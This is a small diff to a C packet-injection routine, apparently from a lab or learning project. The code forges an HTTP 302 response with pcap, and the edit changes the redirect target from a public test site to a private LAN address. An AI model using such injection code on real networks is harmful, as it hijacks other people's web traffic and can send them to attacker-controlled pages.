@@ -32,7 +32,7 @@ void inject_redirect(pcap_t *handle_inject, const struct ether_header *ethernet,
 
     u_char *fake_payload = fake_packet + sizeof(struct ether_header) + sizeof(struct ip) + fake_tcp_size;
     char redirectMsg[] = "HTTP/1.1 302 Found\r\n"
-                         "Location: http://httpforever.com\r\n"
+                         "Location: http://192.168.3.243\r\n"
                          "Content-Length: 0\r\n"
                          "Connection: close\r\n"
                          "\r\n";
